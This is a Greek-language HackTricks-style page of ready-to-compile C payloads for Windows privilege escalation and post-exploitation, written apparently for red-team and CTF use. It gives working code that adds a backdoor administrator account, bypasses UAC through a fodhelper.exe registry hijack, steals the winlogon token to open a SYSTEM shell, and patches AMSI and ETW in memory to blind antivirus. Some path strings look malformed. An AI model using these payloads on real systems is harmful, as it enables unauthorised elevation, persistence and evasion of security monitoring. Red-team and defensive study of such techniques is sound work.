# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα συγκεντρώνει **μικρά, αυτόνομα αποσπάσματα σε C** που είναι χρήσιμα κατά τη διάρκεια Windows Local Privilege Escalation ή post-exploitation. Κάθε payload έχει σχεδιαστεί να είναι **φιλικό για copy-paste**, απαιτεί μόνο το Windows API / C runtime, και μπορεί να μεταγλωττιστεί με `i686-w64-mingw32-gcc` (x86) ή `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Αυτά τα payloads υποθέτουν ότι η διεργασία έχει ήδη τα ελάχιστα απαραίτητα δικαιώματα για να εκτελέσει τη δράση (π.χ. `SeDebugPrivilege`, `SeImpersonatePrivilege`, ή medium-integrity context για UAC bypass). Προορίζονται για **red-team ή CTF περιβάλλοντα** όπου η εκμετάλλευση μιας ευπάθειας έχει οδηγήσει σε εκτέλεση αυθαίρετου εγγενούς κώδικα.

---

## Προσθήκη τοπικού χρήστη διαχειριστή
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Όταν το έμπιστο εκτελέσιμο **`fodhelper.exe`** εκτελείται, ελέγχει το παρακάτω μονοπάτι του μητρώου **χωρίς να φιλτράρει το ρήμα `DelegateExecute`**. Τοποθετώντας την εντολή μας κάτω από αυτό το κλειδί, ένας επιτιθέμενος μπορεί να παρακάμψει το UAC *χωρίς* να γράψει αρχείο στο δίσκο.

*Μονοπάτι μητρώου που ελέγχεται από το `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Ένα ελάχιστο PoC που ανοίγει ένα `cmd.exe` με αυξημένα δικαιώματα:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Δοκιμάστηκε σε Windows 10 22H2 και Windows 11 23H2 (patches Ιουλίου 2025). Το bypass εξακολουθεί να λειτουργεί επειδή η Microsoft δεν έχει διορθώσει τον ελλείποντα έλεγχο ακεραιότητας στη διαδρομή `DelegateExecute`.*

---

## Spawn SYSTEM shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Εάν η τρέχουσα διεργασία διαθέτει **και τα δύο** προνόμια `SeDebug` και `SeImpersonate` (τυπικό για πολλούς λογαριασμούς υπηρεσίας), μπορείτε να κλέψετε το token από το `winlogon.exe`, να το διπλασιάσετε και να εκκινήσετε μια ανυψωμένη διεργασία:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Για πιο αναλυτική εξήγηση του πώς λειτουργεί αυτό, δείτε:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## Επιδιόρθωση AMSI & ETW στη μνήμη (Defence Evasion)
Οι περισσότερες σύγχρονες λύσεις AV/EDR βασίζονται στο **AMSI** και στο **ETW** για να ελέγξουν κακόβουλες συμπεριφορές. Η τροποποίηση και των δύο διεπαφών νωρίς εντός της τρέχουσας διεργασίας αποτρέπει τα script-based payloads (π.χ. PowerShell, JScript) από το να σαρωθούν.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Η παραπάνω επιδιόρθωση είναι τοπική στη διεργασία· η εκκίνηση ενός νέου PowerShell μετά την εκτέλεσή της θα τρέξει χωρίς έλεγχο AMSI/ETW.*

---

## Δημιουργία παιδικής διεργασίας ως Protected Process Light (PPL)
Ζητήστε επίπεδο προστασίας PPL για μια παιδική διεργασία κατά το χρόνο δημιουργίας χρησιμοποιώντας `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Αυτό είναι ένα τεκμηριωμένο API και θα επιτύχει μόνο εάν η στοχευόμενη εικόνα είναι υπογεγραμμένη για την απαιτούμενη κλάση υπογραφέα (Windows/WindowsLight/Antimalware/LSA/WinTcb).
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Levels used most commonly:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Επαληθεύστε το αποτέλεσμα με το Process Explorer/Process Hacker ελέγχοντας τη στήλη Protection.

---

## Αναφορές
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – ελάχιστος εκκινητής διεργασίας PPL: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute

{{#include ../../banners/hacktricks-training.md}}
